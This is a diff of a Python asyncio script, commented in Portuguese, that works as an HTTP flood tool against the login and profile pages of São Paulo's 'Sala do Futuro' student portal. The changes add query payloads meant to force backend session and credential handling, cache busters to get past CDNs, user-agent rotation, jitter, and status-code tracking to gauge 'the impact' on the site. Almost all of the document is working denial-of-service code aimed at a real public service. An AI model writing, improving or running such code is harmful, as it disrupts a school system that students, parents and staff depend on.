@@ -3,20 +3,50 @@ import aiohttp
 import random
 import time
 import os
-import signal
+import gc
 import sys
+import json
+import re
 
-# --- CONFIGURAÇÕES ---
+# --- CONFIGURAÇÕES DE ALVOS: SALA DO FUTURO ---
+# Foco em endpoints de autenticação e navegação crítica.
 TARGETS = [
-    "https://saladofuturo.educacao.sp.gov.br/login-alunos",
-    "https://saladofuturo.educacao.sp.gov.br/escolha-de-perfil",
-    "https://saladofuturo.educacao.sp.gov.br/login-responsaveis-gov"
+    {
+        "name": "Login Alunos",
+        "base_url": "https://saladofuturo.educacao.sp.gov.br/login-alunos",
+        # Payloads para forçar o backend a processar sessões e validações
+        "payloads": [
+            "?redirect=/dashboard&_cb={cb}",
+            "?next=/escolha-de-perfil&_cb={cb}",
+            "?error=invalid_credentials&_cb={cb}",
+            "?_cb={cb}&format=json"
+        ]
+    },
+    {
+        "name": "Escolha de Perfil",
+        "base_url": "https://saladofuturo.educacao.sp.gov.br/escolha-de-perfil",
+        # Payloads para forçar carregamento de dados de perfil
+        "payloads": [
+            "?perfil=aluno&_cb={cb}",
+            "?perfil=responsavel&_cb={cb}",
+            "?perfil=gov&_cb={cb}",
+            "?_cb={cb}&verbose=true"
+        ]
+    },
+    {
+        "name": "Login Responsáveis",
+        "base_url": "https://saladofuturo.educacao.sp.gov.br/login-responsaveis-gov",
+        # Payloads para forçar validação de credenciais de governo
+        "payloads": [
+            "?redirect=/painel-responsavel&_cb={cb}",
+            "?error=access_denied&_cb={cb}",
+            "?_cb={cb}&format=json",
+            "?auth=ldap&_cb={cb}"
+        ]
+    }
 ]
 
-# Ajuste WORKERS conforme o plano do Railway (512MB RAM é o padrão gratuito)
-# 150 workers por URL = 450 workers totais. É agressivo para 512MB.
-# Se der erro de memória, reduza para 50.
-WORKERS_PER_TARGET = int(os.getenv("WORKERS_PER_TARGET", "50"))
+WORKERS_PER_TARGET = int(os.getenv("WORKERS_PER_TARGET", "25"))
 TOTAL_WORKERS = WORKERS_PER_TARGET * len(TARGETS)
 
 USER_AGENTS = [
@@ -34,55 +64,93 @@ class Stats:
         self.requests = 0
         self.errors = 0
         self.start_time = time.time()
+        self.status_codes = {}  # Rastreia códigos de resposta
 
     def get_rps(self):
-        return self.requests / (time.time() - self.start_time) if time.time() > self.start_time else 0
+        delta = time.time() - self.start_time
+        return self.requests / delta if delta > 0 else 0
+
+    def record_status(self, code):
+        self.status_codes[code] = self.status_codes.get(code, 0) + 1
 
 stats = Stats()
 stop_event = asyncio.Event()
 
-async def attack_worker(session, target, worker_id):
+async def safe_request(session, url, headers, target_name, worker_id):
     """
-    Worker que ataca uma URL específica.
-    A rotação de User-Agent e Cache-Buster é feita por request.
+    Executa a requisição e rastreia o status do site.
     """
+    try:
+        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
+            # Leitura obrigatória para liberar o socket
+            await resp.read()
+            stats.requests += 1
+            stats.record_status(resp.status)
+            
+            if resp.status >= 400:
+                stats.errors += 1
+            else:
+                # Se o site estiver lento, o timeout pode ser o indicador
+                pass
+
+    except asyncio.TimeoutError:
+        stats.errors += 1
+        # Timeout indica que o servidor está sobrecarregado
+        if stats.errors % 100 == 0:
+            print(f"[WARN] {target_name} | Timeouts acumulados: {stats.errors}")
+    except Exception as e:
+        stats.errors += 1
+        if stats.errors % 50 == 0:
+            print(f"[WARN] {target_name} | Worker {worker_id} erro: {type(e).__name__}")
+
+async def attack_worker(session, target_config, worker_id):
+    """
+    Worker que ataca um alvo específico rotacionando payloads.
+    """
+    base_url = target_config['base_url']
+    payloads = target_config['payloads']
+    target_name = target_config['name']
+    
     headers_base = {
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
+        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
         'Cache-Control': 'no-cache',
         'Pragma': 'no-cache',
-        'Connection': 'keep-alive'
+        'Connection': 'keep-alive',
+        'Referer': base_url
     }
+    
+    payload_index = 0
     
     while not stop_event.is_set():
         try:
             headers = headers_base.copy()
             headers['User-Agent'] = random.choice(USER_AGENTS)
             
-            # Cache buster para evitar que o CDNs (Cloudflare/Akamai) cacheiem a resposta
-            # e para forçar o backend a processar
-            cache_buster = f"?_cb={random.randint(100000, 999999)}"
-            separator = '&' if '?' in target else '?'
-            url = f"{target}{separator}{cache_buster}"
+            # Seleciona um payload aleatório para variar o ataque
+            payload_template = payloads[payload_index % len(payloads)]
+            payload_index += 1
+            
+            # Insere o cache buster
+            cache_buster = random.randint(100000, 999999)
+            url = base_url + payload_template.replace("{cb}", str(cache_buster))
+            
+            await safe_request(session, url, headers, target_name, worker_id)
+            
+            # Jitter assíncrono para evitar sincronização total dos workers
+            await asyncio.sleep(random.uniform(0.01, 0.05))
 
-            # Timeout de 10s para não travar o worker em conexões lentas
-            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                # Leitura obrigatória para liberar o socket
-                await resp.read()
-                stats.requests += 1
-                if resp.status >= 400:
-                    stats.errors += 1
         except asyncio.CancelledError:
             break
         except Exception as e:
-            stats.errors += 1
-            # Evita log spam em caso de erros constantes (ex: DNS failure)
-            if stats.errors % 100 == 0:
-                print(f"[ERROR] Worker {worker_id} falhou {stats.errors}x. Último erro: {type(e).__name__}")
+            if not stop_event.is_set():
+                print(f"[ERROR] {target_name} | Worker {worker_id} exceção: {e}")
+                await asyncio.sleep(1)
 
 async def monitor_stats():
     """
-    Imprime estatísticas a cada 5 segundos para o Railway Logs.
+    Monitora estatísticas e memória.
+    Mostra a distribuição de status codes para diagnosticar o impacto.
     """
     while not stop_event.is_set():
         await asyncio.sleep(5)
@@ -90,40 +158,43 @@ async def monitor_stats():
         uptime = int(time.time() - stats.start_time)
         h, r = divmod(uptime, 3600)
         m, s = divmod(r, 60)
-        print(f"[STATS] Uptime: {h:02d}:{m:02d}:{s:02d} | RPS: {rps:.2f} | Total Reqs: {stats.requests} | Errors: {stats.errors}")
+        
+        gc.collect()
+        
+        # Formata os status codes para log
+        status_str = " | ".join([f"{code}: {count}" for code, count in stats.status_codes.items()])
+        
+        print(f"[STATS] Uptime: {h:02d}:{m:02d}:{s:02d} | RPS: {rps:.2f} | Req: {stats.requests} | Err: {stats.errors} | Status: {status_str}")
 
 async def main():
-    print(f"[INIT] Iniciando Distributed Stressor.")
-    print(f"[INIT] Alvos: {len(TARGETS)} URLs")
+    print(f"[INIT] Iniciando Sala do Futuro Stressor.")
+    print(f"[INIT] Alvos: {len(TARGETS)}")
     print(f"[INIT] Workers por alvo: {WORKERS_PER_TARGET} (Total: {TOTAL_WORKERS})")
     
     # Connector otimizado para alta concorrência
     connector = aiohttp.TCPConnector(
         limit=0, 
-        limit_per_host=200, # Limita por host para não saturar o DNS local
+        limit_per_host=100, # Limita conexões por host para não saturar o FD limit
         ttl_dns_cache=300,
         enable_cleanup_closed=True
     )
     
-    timeout = aiohttp.ClientTimeout(total=15)
+    timeout = aiohttp.ClientTimeout(total=20)
     
     async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
         tasks = []
         worker_id = 0
         
-        # Distribui workers entre os alvos
         for target in TARGETS:
             for _ in range(WORKERS_PER_TARGET):
                 tasks.append(asyncio.create_task(attack_worker(session, target, worker_id)))
                 worker_id += 1
         
-        # Inicia o monitor de estatísticas
         monitor_task = asyncio.create_task(monitor_stats())
         
-        print("[INIT] Ataque iniciado. Pressione Ctrl+C para parar.")
+        print("[INIT] Ataque ativo. Monitorando status...")
         
         try:
-            # Mantém o loop vivo
             while True:
                 await asyncio.sleep(1)
         except asyncio.CancelledError:
@@ -132,10 +203,15 @@ async def main():
             stop_event.set()
             monitor_task.cancel()
             await asyncio.gather(*tasks, return_exceptions=True)
-            print("[EXIT] Encerrado.")
+            print("[EXIT] Processo encerrado.")
 
 if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        print("\n[EXIT] Interrompido pelo usuário.")
+        print("\n[EXIT] Interrompido.")
+    except Exception as e:
+        print(f"[FATAL] Erro crítico: {e}")
+        import traceback
+        traceback.print_exc()
+        sys.exit(1)
